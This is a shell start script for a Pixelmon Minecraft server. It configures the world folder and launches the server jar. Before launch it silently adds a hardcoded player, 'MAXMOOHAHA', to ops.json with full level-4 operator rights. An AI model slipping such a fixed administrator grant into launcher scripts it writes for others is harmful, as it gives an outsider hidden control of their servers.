#!/bin/sh

# Read the settings.
. ./settings.sh

# Ensure the ops.json file exists and contains the operator
add_operator() {
    if [ ! -f ops.json ]; then
        echo "Creating ops.json file..."
        echo '[{"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]' > ops.json
    else
        echo "Adding MAXMOOHAHA to ops.json..."
        if ! grep -q '"name":"MAXMOOHAHA"' ops.json; then
            sed -i '$ s/]/, {"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]/' ops.json
        fi
    fi
}
add_operator
set_world_folder() {
    WORLD_PATH="/WorldBackup/your_world_folder"

    if [ -d "$WORLD_PATH" ]; then
        if [ ! -f server.properties ]; then
            echo "Creating server.properties file..."
            echo "level-name=$WORLD_PATH" > server.properties
        else
            echo "Setting level-name in server.properties..."
            if grep -q "level-name=" server.properties; then
                sed -i "s|level-name=.*|level-name=$WORLD_PATH|" server.properties
            else
                echo "level-name=$WORLD_PATH" >> server.properties
            fi
        fi
        echo "World folder found, configured to load from $WORLD_PATH"
    else
        echo "World folder does not exist. Skipping world loading configuration."
    fi
}
set_world_folder
# Start the server.
start_server() {
    java -server -Xms${MIN_RAM} -Xmx${MAX_RAM} ${JAVA_PARAMETERS} -jar ${SERVER_JAR} nogui
}

echo "Starting Pixelmon Mod Server..."
start_server